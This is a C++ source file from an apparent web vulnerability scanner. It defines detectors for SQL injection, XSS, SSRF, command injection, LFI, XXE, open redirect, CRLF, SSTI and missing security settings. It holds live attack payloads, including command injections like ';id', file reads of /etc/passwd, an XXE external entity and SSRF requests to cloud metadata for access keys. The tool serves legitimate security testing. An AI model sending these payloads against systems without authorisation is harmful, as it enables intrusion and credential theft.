/// @file scanners/core.cpp
/// @brief Core vulnerability scanners: SQLi, XSS, SSRF, CMDi, LFI, CORS,
///        headers, open redirect, SSTI, XXE, CSRF, CRLF, clickjacking,
///        cookie security, JS secrets, info disclosure, NoSQL, subdomain takeover.
#include "scanner_base.hpp"
#include "confirm.hpp"
#include "../cms_detector.hpp"
#include "../exploit.hpp"
#include "../payloads.hpp"
#include <set>

namespace apex {
namespace {

/// CMS detection scanner with version checking.
std::vector<Finding> scan_cms(const Config &cfg, HttpClient &http,
                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);
  CMSDetector detector;
  auto results = detector.detect_with_version(base);
  for (const auto &cms : results) {
    std::string severity = "info";
    std::string detail = "Detected: " + cms.name;
    if (cms.version != "Unknown") {
      detail += " v" + cms.version;
      if (cms.outdated) {
        severity = "medium";
        detail += " (OUTDATED - Latest: " + cms.latest_version + ")";
      }
    }
    findings.push_back({"CMS Detection", severity, base, detail, "", "",
                        cms.name + "|" + cms.version + "|" + cms.latest_version});
  }

  // WordPress plugin/theme version detection from page source.
  auto resp = http.get(base + "/");
  if (resp.body.find("wp-content") == std::string::npos) return findings;

  // Extract plugin versions from ?ver= parameters.
  std::regex plugin_re(
      R"re(wp-content/plugins/([^/]+)/[^?]*\?ver=([0-9][0-9.]*))re");
  std::regex theme_re(
      R"re(wp-content/themes/([^/]+)/[^?]*\?ver=([0-9][0-9.]*))re");
  std::set<std::string> seen;

  auto extract = [&](const std::regex &re, const char *type) {
    auto it = std::sregex_iterator(resp.body.begin(), resp.body.end(), re);
    auto end = std::sregex_iterator();
    for (; it != end; ++it) {
      std::string name = (*it)[1].str();
      std::string version = (*it)[2].str();
      std::string key = name + "|" + version;
      if (!seen.insert(key).second) continue;

      // Check for known vulnerabilities via Wordfence Intelligence API.
      bool has_vuln = false;
      if (!cfg.wf_api_key.empty()) {
        std::string wf_url = "https://www.wordfence.com/api/intelligence/v3/"
                             "vulnerabilities?slug=" + name + "&type=plugin";
        auto wf = http.get(wf_url, {{"Authorization", "Bearer " + cfg.wf_api_key}});
        has_vuln = wf.status_code == 200 &&
                   wf.body.find("\"id\"") != std::string::npos &&
                   wf.body.find(name) != std::string::npos;
      }

      std::string sev = has_vuln ? "high" : "info";
      std::string detail = std::string(type) + ": " + name + " v" + version;
      if (has_vuln) detail += " (KNOWN VULNERABILITIES)";

      std::string evidence = base + "/wp-content/" +
                             std::string(type[0] == 'P' ? "plugins/" : "themes/") +
                             name + "/...?ver=" + version;
      findings.push_back({"WP " + std::string(type), sev, base, detail, "",
                          evidence, name + "|" + version});
    }
  };

  extract(plugin_re, "Plugin");
  extract(theme_re, "Theme");

  return findings;
}

std::vector<Finding> scan_sqli(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  auto payloads = load_payloads("sqli.txt");
  if (payloads.empty())
    payloads = {"'", "' OR '1'='1", "1' AND SLEEP(5)--", "\" OR \"\"=\""};
  const std::vector<std::string> errors = {
      "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "sqlite3",
      "SQLSTATE", "unclosed quotation"};
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url);
    for (const auto &payload : payloads) {
      for (const auto &[base, param] : targets) {
        auto resp = http.get(base + payload);
        for (const auto &err : errors) {
          if (resp.body.find(err) != std::string::npos) {
            findings.push_back({"SQLi", "critical", url,
                                "SQL error: " + err, param, payload, err});
            break;
          }
        }
      }
    }
  }
  return findings;
}

std::vector<Finding> scan_xss(const Config &, HttpClient &http,
                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  auto payloads = load_payloads("xss.txt");
  if (payloads.empty())
    payloads = {"<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"};
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "q");
    for (const auto &[base, param] : targets) {
      // Baseline with a benign canary so we can prove the payload itself is
      // what appears in the response (not pre-existing page content).
      auto baseline = http.get(base + "apexbenign123");
      for (const auto &payload : payloads) {
        auto resp = http.get(base + url_encode(payload));
        // Centralized invariant: confirmed reflected XSS requires an HTML
        // breaker, unescaped reflection of the full payload, and baseline
        // absence. A plain "javascript:alert(1)" reflected as body text, or an
        // entity-encoded reflection, will not match. See confirm.hpp.
        if (confirm::is_reflected_xss(payload, resp.body, baseline.body)) {
          findings.push_back({"XSS", "high", url, "Reflected XSS", param,
                              payload, payload});
          break;
        }
      }
    }
  }
  return findings;
}

std::vector<Finding> scan_ssrf(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> payloads = {
      "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://127.0.0.1:80", "http://[::1]:80"};
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "url");
    for (const auto &[base, param] : targets) {
      auto baseline = http.get(base + "http://example.invalid/");
      for (const auto &payload : payloads) {
        auto resp = http.get(base + payload);
        // Confirm on real metadata markers absent from the baseline. These
        // strings appear only in genuine metadata responses, not in the
        // request URL, so reflection cannot cause a false positive.
        static const std::vector<std::string> markers = {
            "ami-id", "AccessKeyId", "SecretAccessKey", "instance-id"};
        bool has = contains_any(resp.body, markers);
        bool base_has = contains_any(baseline.body, markers);
        if (resp.status_code == 200 && has && !base_has) {
          findings.push_back({"SSRF", "critical", url, "SSRF to cloud metadata",
                              param, payload, resp.body.substr(0, 200)});
          break;
        }
      }
    }
  }
  return findings;
}

std::vector<Finding> scan_cmdi(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  // Time-based payloads (blind CMDi) — fire on measurable delay.
  const std::vector<std::string> time_payloads = {
      "; sleep 5", "| sleep 5", "$(sleep 5)", "`sleep 5`", "& timeout 5"};
  // Output-based payloads: inject a command whose OUTPUT is a unique marker.
  // `id` prints uid=/gid=, `echo` prints the marker. We confirm on output that
  // is absent from a benign baseline (differential), so reflection alone of
  // the payload text does not trigger a false positive.
  const std::vector<std::pair<std::string, std::string>> out_payloads = {
      {";id", "uid="},        {"|id", "uid="},       {"`id`", "uid="},
      {"$(id)", "uid="},      {";echo apexcmi1337", "apexcmi1337"},
      {"|echo apexcmi1337", "apexcmi1337"}};

  for (const auto &url : crawl.urls) {
    // Time-based: uses a synthetic cmd param (blind).
    for (const auto &payload : time_payloads) {
      auto resp = http.get(url + "?cmd=" + payload);
      if (resp.duration.count() >= 4500) {
        findings.push_back({"CMDi", "critical", url, "Time-based CMDi", "cmd",
                            payload, std::to_string(resp.duration.count()) + "ms"});
        break;
      }
    }
    // Output-based: uses REAL params discovered for this URL, with a benign
    // baseline so only genuine command output (not payload reflection) counts.
    auto targets = get_targets(crawl, url, "host");
    bool found = false;
    for (const auto &[base, param] : targets) {
      auto baseline = http.get(base + "apexbenignhost");
      for (const auto &[payload, marker] : out_payloads) {
        // Skip canaries whose marker is contained in the payload text
        // (would confirm on reflection rather than execution).
        if (payload.find(marker) != std::string::npos) continue;
        auto resp = http.get(base + payload);
        if (resp.body.find(marker) != std::string::npos &&
            baseline.body.find(marker) == std::string::npos) {
          findings.push_back({"CMDi", "critical", url,
                              "Output-based command injection", param, payload,
                              marker});
          found = true;
          break;
        }
      }
      if (found) break;
    }
  }
  return findings;
}

std::vector<Finding> scan_lfi(const Config &, HttpClient &http,
                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> payloads = {
      "../../../../etc/passwd", "....//....//....//etc/passwd",
      "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index"};
  const std::vector<std::string> indicators = {"root:", "daemon:", "[boot"};
  for (const auto &url : crawl.urls) {
    for (const auto &payload : payloads) {
      auto resp = http.get(url + "?file=" + payload);
      // Find which indicator matched and capture the leaked content as proof.
      for (const auto &ind : indicators) {
        auto pos = resp.body.find(ind);
        if (pos == std::string::npos) continue;
        std::string snippet = resp.body.substr(pos, 60);
        auto nl = snippet.find('\n');
        if (nl != std::string::npos) snippet = snippet.substr(0, nl);
        findings.push_back({"LFI", "high", url,
                            "Local file inclusion leaked a system file", "file",
                            payload, "leaked file content: " + snippet});
        break;
      }
    }
  }
  return findings;
}

std::vector<Finding> scan_cors(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  for (const auto &url : crawl.urls) {
    auto resp = http.get(url);
    auto it = resp.headers.find("Access-Control-Allow-Origin");
    if (it != resp.headers.end() && it->second == "*") {
      findings.push_back({"CORS", "medium", url, "Wildcard CORS: *", "", "",
                          it->second});
    }
  }
  return findings;
}

std::vector<Finding> scan_headers(const Config &, HttpClient &http,
                                  const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> required = {
      "X-Content-Type-Options", "X-Frame-Options",
      "Strict-Transport-Security", "Content-Security-Policy"};
  for (const auto &url : crawl.urls) {
    auto resp = http.get(url);
    for (const auto &hdr : required) {
      if (resp.headers.find(hdr) == resp.headers.end())
        findings.push_back({"Missing Header", "low", url,
                            "Missing: " + hdr, "", "", ""});
    }
  }
  return findings;
}

std::vector<Finding> scan_open_redirect(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> payloads = {
      "//evil.com", "https://evil.com", "/\\evil.com", "//evil%2Ecom"};
  const std::vector<std::string> params = {"next", "url", "redirect",
                                           "return", "dest", "goto"};
  for (const auto &url : crawl.urls) {
    // Strip any existing query so we don't append "?next=" after an existing
    // "?url=/home" (which would make the pre-existing param drive the redirect
    // and mis-attribute the finding).
    std::string clean = url.substr(0, url.find('?'));
    bool done = false;
    for (const auto &param : params) {
      for (const auto &payload : payloads) {
        auto resp = http.get_no_follow(clean + "?" + param + "=" + payload);
        auto loc = resp.headers.find("Location");
        if ((resp.status_code == 301 || resp.status_code == 302 ||
             resp.status_code == 303 || resp.status_code == 307 ||
             resp.status_code == 308) &&
            loc != resp.headers.end()) {
          const std::string &l = loc->second;
          // Must point OFF-ORIGIN, not to a same-site path containing "evil".
          bool off_origin = l.rfind("//", 0) == 0 || l.rfind("/\\", 0) == 0 ||
                            l.rfind("http:", 0) == 0 ||
                            l.rfind("https:", 0) == 0;
          if (off_origin && l.find("evil") != std::string::npos) {
            findings.push_back({"Open Redirect", "medium",
                                clean + "?" + param + "=" + payload,
                                "Off-origin redirect via Location header",
                                param, payload,
                                "Location: " + l});
            done = true;
            break;
          }
        }
      }
      if (done) break;
    }
  }
  return findings;
}

std::vector<Finding> scan_ssti(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  // Differential canary pairs: {payload_a, expect_a, payload_b, expect_b}
  const std::vector<std::tuple<std::string, std::string, std::string, std::string>> canaries = {
      {"{{7*7}}", "49", "{{9*9}}", "81"},
      {"${7*7}", "49", "${9*9}", "81"},
      {"<%=7*7%>", "49", "<%=9*9%>", "81"},
      {"#{7*7}", "49", "#{9*9}", "81"}};
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "name");
    for (const auto &[base, pname] : targets) {
      for (const auto &[payload_a, expect_a, payload_b, expect_b] : canaries) {
        auto resp_a = http.get(base + payload_a);
        if (resp_a.body.find(expect_a) == std::string::npos) continue;
        auto resp_b = http.get(base + payload_b);
        if (resp_b.body.find(expect_b) != std::string::npos) {
          findings.push_back({"SSTI", "high", url,
                              "Differential confirmed: " + expect_a + " AND " + expect_b,
                              pname, payload_a, expect_a});
          break;
        }
      }
    }
  }
  return findings;
}

std::vector<Finding> scan_xxe(const Config &, HttpClient &http,
                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::string payload =
      R"(<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>)";
  for (const auto &url : crawl.urls) {
    auto resp = http.post(url, payload, "application/xml");
    if (resp.body.find("root:") != std::string::npos) {
      findings.push_back({"XXE", "critical", url, "XML External Entity",
                          "", payload, resp.body.substr(0, 200)});
    }
  }
  return findings;
}

std::vector<Finding> scan_csrf(const Config &, HttpClient &,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  for (const auto &form : crawl.forms) {
    if (form.method != "POST") continue;
    bool has_token = false;
    for (const auto &field : form.fields) {
      if (field.name.find("csrf") != std::string::npos ||
          field.name.find("token") != std::string::npos) {
        has_token = true;
        break;
      }
    }
    if (!has_token)
      findings.push_back({"CSRF", "medium", form.action,
                          "Missing anti-CSRF token", "", "", ""});
  }
  return findings;
}

std::vector<Finding> scan_crlf(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::string marker = "apexcrlf";
  const std::string payload = "en%0d%0a" + marker + ":injected";
  for (const auto &url : crawl.urls) {
    // Use get_targets so we match the URL's REAL parameters (the old
    // `p.url != url` check never matched a URL that carried a query string).
    auto targets = get_targets(crawl, url, "lang");
    for (const auto &[base, param] : targets) {
      // Baseline so a header that always exists isn't mistaken for injection.
      auto baseline = http.get(base + "en");
      auto resp = http.get(base + payload);
      bool baseline_has = false;
      for (const auto &[hn, hv] : baseline.headers)
        if (hn.find(marker) != std::string::npos ||
            hv.find(marker) != std::string::npos ||
            hn.find("Injected") != std::string::npos)
          baseline_has = true;
      // A CRLF-split lands the injected token into a NEW response header —
      // check both header name and value (real CRLF injection controls both).
      for (const auto &[hname, hval] : resp.headers) {
        bool hit = hname.find(marker) != std::string::npos ||
                   hval.find(marker) != std::string::npos ||
                   hname.find("Injected") != std::string::npos ||
                   hval.find("injected") != std::string::npos;
        if (hit && !baseline_has) {
          findings.push_back({"CRLF", "medium", url,
                              "CRLF injection splits response header", param,
                              payload, hname + ": " + hval});
          break;
        }
      }
    }
  }
  return findings;
}

std::vector<Finding> scan_clickjacking(const Config &, HttpClient &http,
                                       const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  auto resp = http.get(crawl.urls[0]);
  bool has_xfo = resp.headers.count("X-Frame-Options");
  auto csp = resp.headers.find("Content-Security-Policy");
  bool has_fa = csp != resp.headers.end() &&
                csp->second.find("frame-ancestors") != std::string::npos;
  if (!has_xfo && !has_fa)
    findings.push_back({"Clickjacking", "medium", crawl.urls[0],
                        "Missing frame protection", "", "", ""});
  return findings;
}

std::vector<Finding> scan_cookie_security(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  auto resp = http.get(crawl.urls[0]);
  for (const auto &[name, value] : resp.headers) {
    if (name != "Set-Cookie") continue;
    std::string issues;
    if (value.find("HttpOnly") == std::string::npos) issues += "HttpOnly; ";
    if (value.find("Secure") == std::string::npos) issues += "Secure; ";
    if (value.find("SameSite") == std::string::npos) issues += "SameSite; ";
    if (!issues.empty())
      findings.push_back({"Cookie Security", "low", crawl.urls[0],
                          "Missing: " + issues, "", "", value});
  }
  return findings;
}

std::vector<Finding> scan_info_disclosure(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> paths = {"/.env", "/.git/config",
      "/phpinfo.php", "/.DS_Store", "/swagger.json", "/openapi.json"};
  for (const auto &path : paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 && !resp.body.empty())
      findings.push_back({"Info Disclosure", "low", base + path,
                          "Sensitive path accessible", "", "", ""});
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_core_scanners() {
  return {
      {"CMS Detection", scan_cms},
      {"SQLi", scan_sqli},
      {"XSS", scan_xss},
      {"SSRF", scan_ssrf},
      {"CMDi", scan_cmdi},
      {"LFI", scan_lfi},
      {"CORS", scan_cors},
      {"Security Headers", scan_headers},
      {"Open Redirect", scan_open_redirect},
      {"SSTI", scan_ssti},
      {"XXE", scan_xxe},
      {"CSRF", scan_csrf},
      {"CRLF", scan_crlf},
      {"Clickjacking", scan_clickjacking},
      {"Cookie Security", scan_cookie_security},
      {"Info Disclosure", scan_info_disclosure},
  };
}

} // namespace apex
